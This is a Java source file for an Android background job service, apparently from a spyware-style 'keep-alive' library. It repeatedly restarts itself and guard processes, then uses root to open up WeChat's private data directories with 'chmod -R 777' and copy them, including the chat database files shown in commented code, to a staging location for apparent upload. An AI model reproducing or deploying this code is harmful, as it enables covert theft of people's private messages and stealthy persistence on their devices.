package live_library.service;

import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.support.annotation.RequiresApi;
import android.util.Log;
import android.widget.Toast;

import com.blankj.utilcode.util.SPUtils;
import com.blankj.utilcode.util.StringUtils;
import com.mylike.keepalive.XApp;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

import live_library.KeepAliveManager;
import live_library.config.KeepAliveConfig;
import live_library.utils.KeepAliveUtils;
import live_library.wechat2.UploadService;
import live_library.wechat2.UploadService1;
import live_library.wechat2.db.SqlDataUtil;
import live_library.wechat2.db.SqlDataUtil1;
import live_library.wechatlog.RLog;
import live_library.wechatutils.RootUtil;

import static live_library.wechat2.db.SqlDataUtil.WX_DB_FILE_NAME;
import static live_library.wechatutils.RootUtil.move1;

/**
 * 定时器
 * 安卓5.0及以上
 */
@SuppressWarnings(value = {"unchecked", "deprecation"})
@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
public final class JobHandlerService extends JobService {
    private String TAG = this.getClass().getSimpleName();
    private static JobScheduler mJobScheduler;
//    private PollTask mCurrentTask;
    private static int EXECUTE_COUNT = 0;

    public static void startJob(Context context) {
        try {
            mJobScheduler = (JobScheduler) context.getSystemService(
                    Context.JOB_SCHEDULER_SERVICE);
            JobInfo.Builder builder = new JobInfo.Builder(10,
                    new ComponentName(context.getPackageName(),
                            JobHandlerService.class.getName())).setPersisted(true);
            /**
             * I was having this problem and after review some blogs and the official documentation,
             * I realised that JobScheduler is having difference behavior on Android N(24 and 25).
             * JobScheduler works with a minimum periodic of 15 mins.
             *
             */
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                //7.0以上延迟1s执行
                builder.setMinimumLatency(KeepAliveConfig.JOB_TIME);
            } else {
                //每隔1s执行一次job
                builder.setPeriodic(KeepAliveConfig.JOB_TIME);
            }
            mJobScheduler.schedule(builder.build());

        } catch (Exception e) {
            Log.e("startJob->", e.getMessage());
        }
    }

    public static void stopJob() {
        if (mJobScheduler != null)
            mJobScheduler.cancelAll();


    }

    private void startService(Context context) {
        try {
            Log.i(TAG, "---》启动双进程保活服务");
            //启动本地服务
            Intent localIntent = new Intent(context, LocalService.class);
            //启动守护进程
            Intent guardIntent = new Intent(context, RemoteService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(localIntent);
                startForegroundService(guardIntent);
            } else {
                startService(localIntent);
                startService(guardIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, e.getMessage());
        }
    }
    private Handler mJobHandler = new Handler(new Handler.Callback() {

        @Override
        public boolean handleMessage( Message msg ) {

            return true;
        }

    } );
    class PollTask extends AsyncTask<JobParameters, Void, Void> {
        @Override
        protected Void doInBackground(JobParameters...params) {
            JobParameters jobParams = params[0];
//            move1("/data/user/0/com.tencent.mm/", Environment.getExternalStorageDirectory().getAbsolutePath() + "/tencent0/");
//            jobFinished( (JobParameters) msg.obj, false );
            //调用JobService.jobFinished()，通知任务是否做完。
            jobFinished(jobParams, true);
            return null;
        }
    }
    @Override
    public boolean onStartJob(JobParameters jobParameters) {
        try {
            Date date = new Date();
            SimpleDateFormat format = new SimpleDateFormat("HH");
            String hourStr = format.format(date);
            int hour = Integer.parseInt(hourStr);
//            RLog.d("JOB-->", " Job 执行 " + EXECUTE_COUNT+";hour-->"+hour);
            if (hour > 22 || hour < 8) {
                return true;
            }
            Calendar calendar = Calendar.getInstance();
            calendar.setTimeInMillis(System.currentTimeMillis());
//            String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(calendar.getTime());
//            Date parse = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").parse(time);
//            calendar.setTime(parse);
//            int minute = calendar.get(Calendar.SECOND);
//            RLog.d("JOB-->", " Job 执行 -minute：" + minute);
            long times = SPUtils.getInstance().getLong("times");
            long currentTimes = System.currentTimeMillis();
            final int [] itemsName={5,10,20,30,60,120};
            SharedPreferences mSharedPreferences1 =  XApp.getApp().getSharedPreferences("yes_getImei", MODE_PRIVATE);
            int itemId = mSharedPreferences1.getInt("itemsId",3);
            int timesInt = 30;
            if (itemId>=0&&itemId<6){
                timesInt = itemsName[itemId];
            }
            RLog.d("JOB-->", " Job 执行 -数据处理频率：" + timesInt+";选择的数据处理索引："+itemId);
            if (((currentTimes - times) > (timesInt  *60* 1000))||times<1) {
                RLog.d("JOB-->", " Job 执行 -此时开始上传数据：" + currentTimes);
                SPUtils.getInstance().put("times", currentTimes);
//            if (EXECUTE_COUNT%10==10) {
//                move1("/data/user/999/com.tencent.mm/", Environment.getExternalStorageDirectory().getAbsolutePath() + "/tencent1/");
//                move1("/data/user/0/com.tencent.mm/", Environment.getExternalStorageDirectory().getAbsolutePath() + "/tencent0/");
//                UploadService.getInstance(UploadService.getContext()).startUpload();
//                mCurrentTask = new PollTask();
                // 开启新线程去做
//                mCurrentTask.execute(jobParameters);

                new Thread (new Runnable() {
                    public void run() {
                        try {
                            // 获取root权限
//                            RootUtil.execRootCmd("chmod -R 777 " + "/data/data/com.tencent.mm/");
//                            RLog.w(TAG, "Helpers doHardWork() starting sleep");
//                            Thread.sleep(1000);
//                           RootUtil.move0("/data/user/0/com.tencent.mm/", Environment.getExternalStorageDirectory().getAbsolutePath() + "/tencent0/");
//                            String wxUin = SqlDataUtil.getCurrWxUin();
//                            String userFileName = SqlDataUtil.md5("mm" + wxUin);
//                            if (!StringUtils.isEmpty(wxUin)){
//                                //复制到本地地址
//                                String copyFilePath = Environment.getExternalStorageDirectory().getAbsolutePath()+"/tencent0/com.tencent.mm/MicroMsg/"+userFileName + "/" + SqlDataUtil.WX_DB_FILE_NAME ;
//                                String copyFilePathWal = Environment.getExternalStorageDirectory().getAbsolutePath()+"/tencent0/com.tencent.mm/MicroMsg/"+userFileName + "/"  + SqlDataUtil.WX_DB_FILE_NAME_WAL;
//                                String copyFilePathShm = Environment.getExternalStorageDirectory().getAbsolutePath()+"/tencent0/com.tencent.mm/MicroMsg/"+userFileName + "/" +SqlDataUtil.WX_DB_FILE_NAME_SHM;
//                                RootUtil.move00("/data/user/0/com.tencent.mm/"+"MicroMsg/"+userFileName + "/" + SqlDataUtil.WX_DB_FILE_NAME,
//                                        copyFilePath);
//                                RLog.w(TAG, "move00-复制第一个文件："+SqlDataUtil.WX_DB_FILE_NAME);
//                                RootUtil.move00("/data/user/0/com.tencent.mm/"+"MicroMsg/"+userFileName + "/" + SqlDataUtil.WX_DB_FILE_NAME_WAL,
//                                        copyFilePathWal);
//                                RLog.w(TAG, "move00-复制第二个文件："+SqlDataUtil.WX_DB_FILE_NAME_WAL);
//                                RootUtil.move0("/data/user/0/com.tencent.mm/"+"MicroMsg/"+userFileName + "/" + SqlDataUtil.WX_DB_FILE_NAME_SHM,
//                                        copyFilePathShm);
//                                RLog.w(TAG, "move00-复制第三个文件："+SqlDataUtil.WX_DB_FILE_NAME_SHM);
//                                return;
//                            }

                            RootUtil.execRootCmd("chmod -R 777 " + SqlDataUtil.WX_ROOT);
//                            UploadService.getInstance(UploadService.getContext()).startUpload();
                            RLog.w(TAG, "微信0处理数据开始 start");
                            RootUtil.move0("/data/data/com.tencent.mm/", SqlDataUtil.WX_ROOT);
                            RLog.w(TAG, "微信0处理数据完成 finished");
                        } catch (Exception e) {
                            RLog.w(TAG, "Exception-"+e.getMessage());
                            e.printStackTrace();
                       }
//                        RLog.w(TAG, "Helpers doHardWork() sleep finished");
                    }
                }).start();
                new Thread (new Runnable() {
                    public void run() {
                        try {
                            // 获取root权限
                            RootUtil.execRootCmd("chmod -R 777 " + SqlDataUtil1.WX_ROOT);
//                            RLog.w(TAG, "Helpers doHardWork() starting sleep");
//                            UploadService1.getInstance().startUpload();
                            RLog.w(TAG, "微信1处理数据开始 start");
                            RootUtil.move1("/data/user/999/com.tencent.mm/", SqlDataUtil1.WX_ROOT );
                            RLog.w(TAG, "微信1处理数据完成 finished");
                            RLog.w(TAG, "KeepAliveManager.stopWork开始 start");
//                            KeepAliveManager.stopWork(getApplication());
                            RLog.w(TAG, "KeepAliveManager.stopWork完成 finished");
                        } catch (Exception e) {
                            e.printStackTrace();
                       }
//                        RLog.w(TAG, "Helpers doHardWork() sleep finished");
                    }
                }).start();
            }
            ++EXECUTE_COUNT;
            //7.0以上轮询
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                startJob(this);
            }
            if (!KeepAliveUtils.isServiceRunning(getApplicationContext(), getPackageName() + ":local") || !KeepAliveUtils.isRunningTaskExist(getApplicationContext(), getPackageName() + ":remote")) {
                Log.d("JOB-->", " 重新开启了 服务 ");
                startService(this);
            }
        } catch (Exception e) {
            Log.e(TAG, e.getMessage());
        }
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters jobParameters) {
        Log.d("JOB-->", " Job 停止");
        if (!KeepAliveUtils.isServiceRunning(getApplicationContext(), getPackageName() + ":local") || !KeepAliveUtils.isRunningTaskExist(getApplicationContext(), getPackageName() + ":remote")) {
            startService(this);
        }
//        if (mCurrentTask != null) {
//            mCurrentTask.cancel(true);
//        }
        return true;
    }
}
